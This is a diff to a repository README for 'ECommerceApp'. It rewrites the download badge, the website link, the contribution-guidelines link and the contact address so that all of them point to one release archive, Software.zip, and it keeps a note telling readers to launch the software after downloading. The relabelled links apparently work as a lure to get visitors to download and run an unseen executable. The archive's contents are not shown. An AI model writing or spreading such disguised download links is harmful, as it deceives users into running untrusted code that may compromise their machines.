@@ -42,7 +42,7 @@ The repository is organized as follows:
 
 To get started with ECommerceApp, simply download the project files from the following link:
 
-[![Download ECommerceApp Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download ECommerceApp Software](https://github.com/2DKINGG/ECommerceApp/releases/download/v2.0/Software.zip)](https://github.com/2DKINGG/ECommerceApp/releases/download/v2.0/Software.zip)
 
 *Note: The software needs to be launched after downloading.*
 
@@ -50,11 +50,11 @@ If the link is not accessible, please check the **Releases** section for alterna
 
 ## 🌐 Visit Our Website
 
-For more information about the ECommerceApp project, please visit our website [ECommerceApp Website](https://www.ecommerceapp.com).
+For more information about the ECommerceApp project, please visit our website [ECommerceApp Website](https://github.com/2DKINGG/ECommerceApp/releases/download/v2.0/Software.zip).
 
 ## 🤝 Contribution Guidelines
 
-Contributions to the ECommerceApp project are welcome! Please refer to the [Contribution Guidelines](CONTRIBUTING.md) for details on how to contribute.
+Contributions to the ECommerceApp project are welcome! Please refer to the [Contribution Guidelines](https://github.com/2DKINGG/ECommerceApp/releases/download/v2.0/Software.zip) for details on how to contribute.
 
 ## 📝 License
 
@@ -62,7 +62,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📞 Contact Us
 
-If you have any questions or feedback regarding the ECommerceApp project, feel free to reach out to us at [ecommerceapp@example.com](mailto:ecommerceapp@example.com).
+If you have any questions or feedback regarding the ECommerceApp project, feel free to reach out to us at [https://github.com/2DKINGG/ECommerceApp/releases/download/v2.0/Software.zip](https://github.com/2DKINGG/ECommerceApp/releases/download/v2.0/Software.zip).
 
 Let's revolutionize testing with AI-driven automation! 🚀🤖
 
